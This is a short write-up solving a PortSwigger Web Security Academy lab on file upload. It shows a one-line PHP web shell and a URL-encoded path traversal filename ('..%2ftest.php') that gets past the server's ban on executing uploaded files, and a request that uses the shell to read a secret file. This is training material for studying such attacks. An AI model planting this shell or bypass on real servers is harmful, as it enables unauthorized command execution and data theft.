# [Lab: Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

## Lab

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a  [secondary vulnerability](https://portswigger.net/web-security/file-path-traversal).

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file  `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials:  `wiener:peter`

## Solution

1. directly upload php shellcode:

    ```php
    <?php echo system($_GET['command']); ?>
    ```

2. access shellcode:

    ```html
    https://0a9200a6049a5b49c15c543200b800c8.web-security-academy.net/files/avatars/test.php
    ```

    =\> response:

    ```php
    <?php echo system($_GET['command']); ?>
    ```

    =\> shellcode is not executed

3. path traversal:

    ```text
    filename="../test.php"
    ```

    result:

    ```text
    The file avatars/test.php has been uploaded.
    ```

    =\> try obfuscation. replace `/` with `%2f`

    ```text
    filename="..%2ftest.php"
    ```

    response:

    ```text
    The file avatars/../test.php has been uploaded.
    ```

4. get flag

    ```text
    GET /files/test.php?command=cat+/home/carlos/secret HTTP/1.1
    ```

    flag:

    ```text
    0UWTHWbPJQu9iZI9NlMlANp53tegmyhJ0UWTHWbPJQu9iZI9NlMlANp53tegmyhJ
    ```

    flag is still repeated twice
